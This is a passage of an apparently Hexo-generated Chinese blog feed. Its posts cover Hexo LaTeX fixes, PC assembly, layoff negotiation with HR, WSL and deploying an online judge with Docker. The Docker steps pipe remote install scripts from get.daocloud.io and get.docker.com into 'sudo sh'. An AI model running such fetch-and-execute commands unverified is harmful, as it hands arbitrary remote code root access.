src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703185323511.png" srcset="/img/loading.gif" lazyload="" alt="开启pages的远程仓库"></p><p>如果要打开评论，这里推荐用Valine，在<strong>主题</strong>下的_config.yml，把enable的false改成true，并且注册Valine账号填写appId和appKey</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703185504138.png" srcset="/img/loading.gif" lazyload="" alt="评论"></p><p>另外主题配置下的github地址换成自己的github地址(还有好几个哦，自己搜索替换一下吧)</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703185806555.png" srcset="/img/loading.gif" lazyload="" alt="github地址"></p><p>文章的img如果没有填写，就会从指定的图片里根据哈希码选择一张图片作为封面（还是在主题配置修改）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703190002407.png" srcset="/img/loading.gif" lazyload="" alt="文章封面图片"></p><h2 id="hexo中的latex踩坑"><a href="#hexo中的latex踩坑" class="headerlink" title="hexo中的latex踩坑"></a>hexo中的latex踩坑</h2><p><strong>latex换行的bug(是插件渲染的问题，可以用四个/来换行)，其他方面都没毛病。</strong>hexo-renderer-pandoc 我也尝试过，但效果还来还是不如hexo-renderer-kramed（即上面安装的那个插件）如果不想用4个/来换行也可以参考下这个<a href="https://wangcong.net/article/HexoWihLaTeX.html" target="_blank" rel="noopener">Hexo中LaTeX公式渲染</a>或<a href="https://jdhao.github.io/2017/10/06/hexo-markdown-latex-equation/" target="_blank" rel="noopener">Hexo 书写 LaTeX 公式时的一些问题及解决方法</a></p><p>（总之，hexo的latex渲染还是有点坑，但配置好其实也没毛病~推荐就用我上面指定的那些插件）</p><p>如果用typora写出来的latex有问题的话，比如像这样</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708221444940.png" srcset="/img/loading.gif" lazyload="" alt="Typora写的公式VScode上看起来也没毛病"></p><p>在各种markdown编辑器看着这个公式都能正常显示，但实际上经过hexo渲染打开的网页的就会像下图这样：</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708220658307.png" srcset="/img/loading.gif" lazyload="" width="50%"></center><p>这个其实是因为Typora的markdown源码不标准，所以尽管在hexo的mathjax渲染出问题</p><p>如果打开CSDN或者github的markdown编辑就会看出问题了</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708221053504.png" srcset="/img/loading.gif" lazyload="" alt="image-20200708221053504"></p><p>其实问题就出在typora的公式块的两个<kbd> $ $ </kbd>不是相连的，所以正确的解法是把中间的<strong>空行</strong>还有一些<strong>多余的空格</strong>删除掉即可。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708223051543.png" srcset="/img/loading.gif" lazyload="" alt="$$$$中间不回车"></p><p>正常显示之后，再把这段复制粘贴到vscode打开的md文件，hexo渲染出的网页就显示正常啦。</p><p>(一句话，想办法让公式在CSDN的markdown编辑器显示正常即可)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>台式机DIY及组装</title>
      <link href="/2020/02/20/%E7%94%B5%E8%84%91%EF%BC%9A%E5%8F%B0%E5%BC%8F%E6%9C%BADIY%E5%8F%8A%E7%BB%84%E8%A3%85/"/>
      <url>/2020/02/20/%E7%94%B5%E8%84%91%EF%BC%9A%E5%8F%B0%E5%BC%8F%E6%9C%BADIY%E5%8F%8A%E7%BB%84%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>从新手走向老司机，程序员也会修电脑</p><a id="more"></a><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>相信老司机都知道台式机的种种好处，因此从零件购买-组装一系列操作毫不含糊（推荐新手阅读知乎了解电脑整机购买和DIY的区别： <a href="https://zhuanlan.zhihu.com/p/38978421" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/38978421</a>  ）。  但是对新手来说，或许还是有难度的，本篇将介绍入门级台式机的选购以及组装。    </p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/ae485a69cb05edb3111231cb0a882ca.jpg" srcset="/img/loading.gif" lazyload="" align="center"></center>**适合食用人群**：固定地点办公及低配置轻度游戏玩家。  <ul><li>选购</li><li>组装</li><li>安装系统</li></ul><h1 id="选购"><a href="#选购" class="headerlink" title="选购"></a>选购</h1><p>台式机主要部件：CPU、显卡、主板、硬盘、内存条、电源、机箱、音响、显示屏  </p><p>预算：2000RMB左右  </p><p>推荐购买渠道：官网/京东自营（PS：一些小规模的店整机出售，看似性能不错，实际上很可能是二手零件组装，建议新手上京东自营购买）  </p><p>因为是入门级的，主要针对办公及低配置轻度游戏玩家（例如玩LOL），所以在这里推荐方案是<strong>暂时</strong>不购买显卡，因为要考虑到电脑的长期使用和可扩展性（计划很可能赶不上变化嘛，也许你现在只玩玩低配置的游戏，以后又玩高配置或者觉得电脑性能需要提升一个阶级呢）办公就不需要独立显卡了，直接选个带核显的cpu。    </p><p>CPU：emmm，cpu从品牌上说分为两大阵营，Intel和AMD。粗略讲，Intel耐用品质好；AMD性价比高，多受游戏玩家钟爱。<br>通过简单的学习粗略地了解一下如何看CPU型号来分辨性能。<br><a href="https://zhuanlan.zhihu.com/p/20519713" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/20519713</a><br>CPU性能可以百度搜索一下”CPU天梯图”（同理，显卡也可以搜索”显卡天梯图”）查看具体性能排行  </p><p>显卡：不买，重度游戏玩家请查看具体游戏配置需求，再选择是1050ti/1660/1080ti/2080ti</p><p>主板：<strong>主板要对上CPU</strong>，最好确定选哪款CPU之后选择推荐主板（例如你买的CPU推荐A320主板，那么就京东搜索”A320主板”，然后挑选一款）。一定要选择CPU支持的主板。推荐主板品牌：华硕、技嘉、微星、华擎（推荐力度有先后顺序），但是具体还是得看看价格。购买主板还得看看支持标准，以及支持几通道内存（就是可以插几个内存条）</p><p>内存条：内存条可以买二手的，但实际上二手九成新的就便宜那么十几块，何必呢<br>内存条这个没太多所谓，海盗船/金士顿/刚威/宇瞻……觉得哪个名字好听就买哪个吧！这时候你购买主板看的内存标准就派上用场了，<strong>注意频率</strong>，看看主板是否支持该显卡频率（比如你买的内存条是DDR4 3000，但是显卡最多支持DDR4 2666，那这样就不行喽）</p><p>电源：电源建议买一线品牌的（例如台达、海韵、振华、安钛克、冷酷至尊，排名不先分后，没在上面的不代表不好，只是列几个给新手挑选），电源不稳定输出会有各种各样的问题。注意功率，如果是办公，300w的电源足够啦，但是考虑到以后可能加显卡，建议还是450W起步吧！（其实电源功率的选择，CPU、主板这些功率加起来再预留个100w就够了）。非发烧友在电源上倒不必太在乎铜牌、银牌、金牌这些分级，差不了多少，省不了多少电。</p><p>硬盘：硬盘分机械硬盘和固态硬盘，办公建议固态，不够补充机械硬盘。对一般人来说1T的储存空间够用了。硬盘基本上是希捷和西部数据两个牌子，同等储存空间、<strong>转速</strong>（转速越高越好）看哪个便宜买哪个。</p><p>机箱：机箱大小分类挺好，为了之后的扩展和通风、易安装等，推荐中塔式机箱（ATX），注意看机箱支持的主板大小和可安装的风扇数量、硬盘个数。挑个好看的机箱。如果要求高就考虑一下隔音。  </p><p>散热硅胶：对的，你没看错。散热硅胶是涂在CPU与散热器之间的，主要是为了让CPU和散热器紧密性良好以达到良好的散热效果。为什么这里要额外买呢（盒装的CPU里面一般都有），因为原装的散热硅胶很可能是“水泥”（就是散热器装上去就拿不下来了QAQ，而且散热效果又……）所以还是建议买一支，或者找认识的修电脑的朋友拿点。  </p><p>显示屏：参考屏幕尺寸、色域、刷新率、分辨率、可视角度。值得说说的是，刷新率不是越高越好，游戏玩家需要高刷新率，但是如果是设计师，高刷新率反而成了累赘。屏幕大看着爽；色域高颜色鲜艳饱满；有些可视角度较小可以起到防窥屏的作用……   </p><p>音响：首先区别下音响和音箱，音响是指整个设备，音箱~就一个箱子。音响的购买主要看功率、信噪比、声道、频响范围、失真率。一般是额定功率越高越好，信噪比越高越好，频响范围越大越好，失真率越低越好。声道常见的有2.0、2.1、5.1、7.1。小数点前面的数字是中高音音响个数，后面的数字是低音音响个数。（2.0的设计不太一样，2.0是把低音做在两个音箱上了，后面三种是把低音分离出来到一个独立的音箱）一般入门级的音响都是2.0、2.1的声道，建议听音乐选2.0，震撼场面例如看电影、打游戏选2.1。  </p><ul><li>列个参考表单</li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/%E8%BF%90%E7%BB%B4/04a8a6b6a997b4ac0da55a1f7da346c.jpg" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>可以根据自己的预算调整配置，比如纯办公和听音乐看电影，就可以把8G的内存换成4G的；CPU换成大概在400价位的速龙3000或Intel奔腾5420（对应的主板也换成知名度相对较低的，能便宜个几十元）电源换成300W的；音响换成几十元的2.0声道；硬盘找个机械硬盘顶一下（但是千万不要为了省钱买二手的）……同理，也可以根据自己的实际需求调高配置。如果是打游戏，duck不必各方面都调高，直接买显卡呀！    </p><h1 id="组装"><a href="#组装" class="headerlink" title="组装"></a>组装</h1><blockquote><ul><li>首先，洗个手冷静一下，莫慌，很简单的。  </li></ul><ul><li>先把CPU的针脚对应主板的针脚，拉起主板上放置CPU的闸，将CPU放入（放置正确会感觉CPU被吸进主板）然后稍微用点力将闸拉下扣住。</li></ul><ul><li>在CPU上涂点散热硅胶，不要太多也不要太少，散热器压下去会让散热硅胶均匀，但是不要让散热硅胶碰到主板了。 </li></ul><ul><li>把主板上两个固定的板拆下（底座留着）散热器（盒装主板都带有的）四个螺丝位对上，对着卡扣压下去，觉得稳了就行了。（京东购买主板的页面查看详情有介绍安装）</li></ul><ul><li>把内存条卡槽两边拉开，对着卡位插入内存条。</li></ul></blockquote><blockquote><ul><li>然后拆开机箱（一般都是后面拧下螺丝，然后两侧的板向后滑动）</li></ul><ul><li>一般机箱都是把把电源安装在机箱上方的尾部（你想想台式机是不是一般都是后面插电），风扇朝下，拧上四颗螺丝（买机箱都会送对应的螺丝），线接在主板写了CPU fun那里。</li></ul><ul><li>把赠送的主板IO挡板从机箱内部放到机箱尾部（一般插网线、usb的那个位置），敲一下装上固定。</li></ul><ul><li>主板对上接口找到分散在主板边缘的孔位，拧上螺丝。</li></ul><ul><li>将硬盘固定在机箱指定的位置，拧紧螺丝（如果不紧，开机后可能会有声音，硬盘振动的声音）</li></ul><ul><li><p>主板、硬盘接上电源线，插的时候看卡扣位置就知道该哪个方向了。硬盘线插在主板上。</p></li><li><p>找找机箱线的接口（一般在主板边缘），一一对应接上去。</p></li><li><p>盖上机箱。</p></li></ul></blockquote><h1 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h1><p><a href="../../../02/29/an-zhuang-deepin-xi-tong/">推荐我的另一篇博文，安装deepin系统</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650203538&amp;idx=3&amp;sn=86ad2269949d7cb09b6ecbf3a38f5822&amp;chksm=8ee1457eb996cc6803b8d151844740325b9ab39e06511c7f31183c386bb91f9a67a82200fb7f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">软件安装管家，安装win10</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面对流氓HR，新人该注意什么</title>
      <link href="/2020/02/09/%E9%9D%A2%E5%AF%B9%E6%B5%81%E6%B0%93HR%EF%BC%8C%E6%96%B0%E4%BA%BA%E8%AF%A5%E6%B3%A8%E6%84%8F%E4%BB%80%E4%B9%88/"/>
      <url>/2020/02/09/%E9%9D%A2%E5%AF%B9%E6%B5%81%E6%B0%93HR%EF%BC%8C%E6%96%B0%E4%BA%BA%E8%AF%A5%E6%B3%A8%E6%84%8F%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p>该文章为学习B站UP主“老蒋巨靠谱”的视频[网易暴力裁员：面对面对流氓HR，新人应该注意什么]所记录</p><a id="more"></a><p>该文章为学习B站UP主<a href="https://space.bilibili.com/119801456" target="_blank" rel="noopener">老蒋巨靠谱</a>的视频所记录。</p><p>原视频来自bilibili：<a href="https://www.bilibili.com/video/av77107846" target="_blank" rel="noopener">网易暴力裁员：面对面对流氓HR，新人应该注意什么</a></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>网易裁员 ，开除患重病员工，存在HR套路员工的情况</p><p>小公司常做这种不合规的事</p><h2 id="非正常裁员保护利益的手段"><a href="#非正常裁员保护利益的手段" class="headerlink" title="非正常裁员保护利益的手段"></a>非正常裁员保护利益的手段</h2><h3 id="1-不要把HR当朋友"><a href="#1-不要把HR当朋友" class="headerlink" title="1.不要把HR当朋友"></a>1.不要把HR当朋友</h3><p><strong>HR</strong>：工作内容是缩减人力成本，几乎都有KPI考核（员工离职前的年终、离职补偿等都属于人力成本，<strong>HR的工作内容是缩减人力成本</strong>,甚至有些公司的HR的工作目标和业绩就是尽可能地压缩员工利益），从员工角度考虑HR的员工百中无一</p><p>人情是人情，工作是工作</p><p>产生利益冲突只剩劳资关系</p><p>员工与公司产生利益冲突，自己可不惜以最坏的恶意去揣测</p><p>HR晓之以情动之以理，eg：”我们HR也要恰饭”————正解：就算真的伤害到HR，这不是公司在HR制度方面和价值观的错，如果自己做的正确就不应该为公司的错埋单（收起幼稚的同理心）</p><h3 id="2-留档意识"><a href="#2-留档意识" class="headerlink" title="2.留档意识"></a>2.留档意识</h3><p>利益冲突保持不正常状态，做到以下三点：</p><ol><li><ul><li><p><strong>第一时间备份</strong>（工作成果、内容、素材；OA系统、邮件系统、各种群聊和同事领导HR的沟通记录，行政信息、业绩评定）————公司能在触及你利益前把你的所有权限停掉；</p></li><li><p><strong>录音</strong></p></li></ul></li><li><p><strong>反被害思维</strong>(领导HR也对自己录音)：</p><ul><li>谨言慎行（例如:“不要轻易承认自己工作中的错误”，任何工作都是不完美的，新人可能会说：“虽然自己做的不好，但是同组的其他人也不比我好啊…”，HR会找茬，反击：“我不认可你说的这些话，如果想跟我讨论我在工作中的失误，请你先准备好关于我工作存在重大失误的相关证据再谈。”  ）</li><li><strong>不要轻易在法律文书上签字</strong>(签字之后就没有回头路了，维权不了)</li></ul><p><strong>博弈</strong></p><ul><li><p>典型情况：公司不想付出n+1的裁员成本，员工想拿到赔偿但不想留下辞退记录（双方互利操作：员工主动辞职，公司赔偿少于n+1.)</p><p>(赔偿注意防止套路，与HR达成的<strong>口头协议</strong>都当作不存在,坚决避免先主动提交辞职，看到钱或者先签补偿性条款再说）</p></li></ul></li><li><p>关键沟通要走OA系统或邮件（要是公司邮箱，不能是个人邮箱，而且最好抄送HR部门最高领导，防止说是私人沟通不代表公司立场）</p><p>案例：小公司员工被裁想获得n+1补偿，HR说不如你先放个一周的年假回来再谈（小公司没有OA系统，没有申请放假，口头达成一致，回来被告知旷工）</p></li></ol><h3 id="3-谈判前详细了解劳动法并且想好自己的底线和筹码"><a href="#3-谈判前详细了解劳动法并且想好自己的底线和筹码" class="headerlink" title="3.谈判前详细了解劳动法并且想好自己的底线和筹码"></a>3.谈判前详细了解劳动法并且想好自己的底线和筹码</h3><p>基本前提懂法（中华人民共和国劳动法），当地劳动局有无补充条款，咨询劳动者保护热心</p><p>想好诉求，而不是愤怒；想好怎么保护自己而不是给对方最大的伤害</p><p>筹码：加班费、全额的五险一金（比如你月薪1万，公司按3千的标准给你交社保）</p><p>底线：工资（离职前给我，少一分都不行），社保（虽然不是全额，但每个月的社保给我交，少一个月也不行），无法接受业绩良好的情况下公司找个借口不给我补偿</p><p>最终计算工资，常用的是，把这个月的实际工作天数除以21.75，而不是除以30（比如我离职这个月工作了10.875天，公司得付我半个月的工资）</p><p>法定假日带薪，应该计入工作时长（1月1日带薪，2、3号调休）</p><p>如果公司不想赔偿让员工走人，请跟HR说：“这一点我很抱歉，我无法接受，我相信咱们公司不会这么坑员工，我也相信您是一个好人，是个知情达理的人。”（先抬HR和公司）“但我也是个知情达理的人，虽然我知道公司没有每个月按照我的实际标准缴纳社保，但这是在我入职的时候跟我谈好的，所以我虽然有这样的权利，但是您放心，我不会把这个事捅到劳动局去瞎闹。只要公司能考虑到我的利益，咱们都过得去就行了。”（这句话的意思：说明自己的底线，告诉HR自己的筹码）</p><h3 id="4-不要轻易动用“核武器”"><a href="#4-不要轻易动用“核武器”" class="headerlink" title="4.不要轻易动用“核武器”"></a>4.不要轻易动用“核武器”</h3><p>不要企图用公司/老板真正的黑料去威胁公司，尤其是不要去威胁小公司（前面都是没有翻脸，就算是捅到劳动局了，小公司无非赔个几万到几十万）例如爆料投标（虽说出于正义，但也不可，且一般小公司黑料没有公共性议题的价值，且一般人没有公关方面的资源和经验）</p><p>做了没有妥协空间，大公司有舆论压力，小公司没有~可能立马翻脸</p><p>用了爆黑料事情大概率会脱离掌控或预知</p><h3 id="5-劳动法是倾向于劳动者一方的，要有底气"><a href="#5-劳动法是倾向于劳动者一方的，要有底气" class="headerlink" title="5.劳动法是倾向于劳动者一方的，要有底气"></a>5.劳动法是倾向于劳动者一方的，要有底气</h3><p>劳资双方力量不等对，劳动者脆弱，但…</p><p>常见猫腻：</p><ul><li><p>不签劳动合同（例如盖公章的负责人不在）</p><p>法律上存在劳动事实（需要材料相互印证，例如和同事的沟通记录、工作成果、工作中间素材、工牌、饭卡、上岗证等也可以成为裁定依据——只要有，就算没有劳动合同也不影响），且<strong>不签劳动合同公司需要给双倍赔偿</strong></p></li><li><p>HR用劳动法第3章第25条来威胁员工</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200209010613863.png" srcset="/img/loading.gif" lazyload="" alt="image-20200209010613863"></p><p>流氓HR常用第2条和第3条，比如说你违反公司纪律，迟早早退、项目里没有按照规定造成损失等（击垮你的心理防线），并放下话：“如果你不主动走，就依法开除你。”（咨询在其他公司的HR朋友和当地劳动局）</p><p>法律中真正认定劳动者存在严重违反劳动纪律或者公司规定的情况或者造成公司重大损失<strong>是一件很困难的事，条件对公司来说很苛刻</strong>（公司内容本身必须合理合法否则认定为无效条文；且公司需证明规章制度经过了民主的程序；公司需证明规则制度向全体员工公示或告知过~墙上贴着也不算，需要公司邮件发过或者群里发过并让员工回复收到请确认或者纸质材料签字；且公司需要提交证明）</p><p><strong>劳动仲裁是武器，不要轻易动用</strong>，不要轻易放弃自己的权利。</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>系统：WSL（win10的子系统Linux）</title>
      <link href="/2020/02/05/%E7%B3%BB%E7%BB%9F%EF%BC%9AWSL%EF%BC%88win10%E7%9A%84%E5%AD%90%E7%B3%BB%E7%BB%9FLinux%EF%BC%89/"/>
      <url>/2020/02/05/%E7%B3%BB%E7%BB%9F%EF%BC%9AWSL%EF%BC%88win10%E7%9A%84%E5%AD%90%E7%B3%BB%E7%BB%9FLinux%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>win10上用linux</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在Windows下使用linux系统（可shell命令行操作或图形界面操作）</p><p>##　步骤</p><ul><li><a href="https://blog.csdn.net/m0_37990055/article/details/89709963?from=groupmessage" target="_blank" rel="noopener">建立软链接（非必须）</a></li><li><a href="https://blog.csdn.net/zhouzme/article/details/78780479" target="_blank" rel="noopener">安装Ubuntu</a></li><li><a href="https://www.jianshu.com/p/f7ce44ecdd06" target="_blank" rel="noopener">安装并配置cmder（非必须）</a></li><li><a href="https://blog.csdn.net/NovaSliver/article/details/83190269" target="_blank" rel="noopener">安装并连接图形界面</a></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/zhouzme/article/details/78780479" target="_blank" rel="noopener">Windows10安装Linux子系统Ubuntu  神神的蜗牛</a></p><p><a href="https://blog.csdn.net/m0_37990055/article/details/89709963?from=groupmessage" target="_blank" rel="noopener">Windows下Linux子系统迁移到非系统盘  zhanjzh </a></p><p><a href="https://www.jianshu.com/p/3e627ff45ccb" target="_blank" rel="noopener">Windows 安装和配置 WSL 希希里之海</a></p><p><a href="https://blog.csdn.net/NovaSliver/article/details/83190269" target="_blank" rel="noopener">Win10Linux子系统（WSL）图形界面的安装  NovaSliver</a></p><p><a href="https://www.jianshu.com/p/f7ce44ecdd06" target="_blank" rel="noopener"><em>LG</em></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建OJ系统</title>
      <link href="/2020/02/04/%E6%90%AD%E5%BB%BAOJ%E7%B3%BB%E7%BB%9F/"/>
      <url>/2020/02/04/%E6%90%AD%E5%BB%BAOJ%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>介绍如何利用开源OJ系统源码快速搭建OJ系统</p><a id="more"></a><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ol><li><p>安装依赖环境</p><p>ubuntu系统用户：</p><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt-get update &amp;&amp; sudo apt-get install -y vim python-pip curl gitpip install docker-compose</code></pre></div><p>centos系统用户：</p><div class="hljs code-wrapper"><pre><code class="hljs shell">yum update &amp;&amp; yum install -y vim python-pip curl gitpip install docker-compose</code></pre></div></li></ol><ol start="2"><li><p>安装docker</p><p> 国内用户使用脚本一键安装:<code>sudo curl -sSL https://get.daocloud.io/docker | sh</code> </p><p>国外用户使用脚本一键安装: <code>sudo curl -sSL get.docker.com | sh</code></p></li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>克隆源码</p><div class="hljs code-wrapper"><pre><code class="hljs shell">git clone -b 2.0 https://github.com/QingdaoU/OnlineJudgeDeploy.git &amp;&amp; cd OnlineJudgeDeploy</code></pre></div></li><li><p>启动docker</p><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span></code></pre></div><ul><li>可能遇到的问题：ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</li><li>解决办法: 运行命令<code>sudo systemctl start docker</code>启动docker(若无效请查看<a href="https://www.awaimai.com/2587.html" target="_blank" rel="noopener">参考资料</a>按照对应情况排查)</li></ul></li><li><p>运行OJ系统</p><div class="hljs code-wrapper"><pre><code class="hljs shell">docker ps -a</code></pre></div></li><li><p>修改端口</p><p>一般80和443端口都被占用了,所以得修改端口</p><p><code>vim  docker-compose.yml</code>  </p><p>在最下面修改端口号</p></li><li><p>打开web浏览器访问</p><p><code>本机ip+端口</code>访问OJ首页</p><p><code>本机ip+端口/admin</code>     (初始账号用户名 root ，密码 rootroot )</p><p>例如，ip是185.12.254.40，第四步骤设置的其中一个端口是1000 </p><p>则通过<code>185.12.254.40:1000</code>访问首页</p><p>``185.12.254.40:1000/admin`访问管理员帐号</p></li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://cndrew.cn/2019/08/23/oj/" target="_blank" rel="noopener">开源青岛大学oj的搭建(傻瓜式操作) ： Uncle_drew </a></p><p><a href="https://www.awaimai.com/2587.html" target="_blank" rel="noopener">docker-compose up解决错误ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的图像相似度计算方法</title>
      <link href="/2020/01/15/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E5%83%8F%E7%9B%B8%E4%BC%BC%E5%BA%A6%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/"/>
      <url>/2020/01/15/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BE%E5%83%8F%E7%9B%B8%E4%BC%BC%E5%BA%A6%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>用于完成图片两两之间的相似度计算</p><a id="more"></a><h2 id="塑料瓶图像检测"><a href="#塑料瓶图像检测" class="headerlink" title="塑料瓶图像检测"></a>塑料瓶图像检测</h2><p>目的：用于判断一张图片是否为塑料瓶；</p><p>条件：总计300多张图片分为70多类，同一类塑料瓶分别放置在同一个文件夹；</p><p>思路：选取每个文件夹的一张图片与目标图片对比计算返回相似度最高的值，通过多次试验确定阈值，超过阈值则判定为是塑料瓶，否则不是；</p><p>目录：</p><p>[TOC]</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul><li><p>所有测试结果均为程序第一次运行结果</p></li><li><p>每一组测试的第一个（第一个样本）都是同一张图片相互比对</p></li><li><p>每一组测试的第二三四五个测试样本均是与第一个测试样本比对</p></li><li><p>以下为选用的5个测试样本</p></li><li><p>图片放置在与程序同一位置的images文件夹</p></li></ul><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200114104340189-1592736787820.jpg" srcset="/img/loading.gif" lazyload="" width="40%"></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200114104446378-1592736787433.jpg" srcset="/img/loading.gif" lazyload="" width="40%"></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/202001141044484-1592736787888.jpg" srcset="/img/loading.gif" lazyload="" width="40%"></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200114104502540-1592736787890.jpg" srcset="/img/loading.gif" lazyload="" width="40%"></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200114104509945-1592736787431.jpg" srcset="/img/loading.gif" lazyload="" width="40%"></center><h2 id="1-方法"><a href="#1-方法" class="headerlink" title="1.方法"></a>1.方法</h2><ul><li><p>直方图</p></li><li><p>互信息</p></li><li><p>余弦相似度 </p></li><li><p>感知哈希算法</p></li></ul><h2 id="2-测试结果（单张图片比对）"><a href="#2-测试结果（单张图片比对）" class="headerlink" title="2.测试结果（单张图片比对）"></a>2.测试结果（单张图片比对）</h2><h3 id="直方图"><a href="#直方图" class="headerlink" title="直方图"></a>直方图</h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> *begin_time = time()<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_regalur_image</span><span class="hljs-params">(img, size=<span class="hljs-params">(<span class="hljs-number">256</span>, <span class="hljs-number">256</span>)</span>)</span>:</span>    <span class="hljs-keyword">return</span> img.resize(size).convert(<span class="hljs-string">'RGB'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hist_similar</span><span class="hljs-params">(lh, rh)</span>:</span>    <span class="hljs-keyword">assert</span> len(lh) == len(rh)    <span class="hljs-keyword">return</span> sum(<span class="hljs-number">1</span> - (<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> l == r <span class="hljs-keyword">else</span> float(abs(l - r)) / max(l, r)) <span class="hljs-keyword">for</span> l, r <span class="hljs-keyword">in</span> zip(lh, 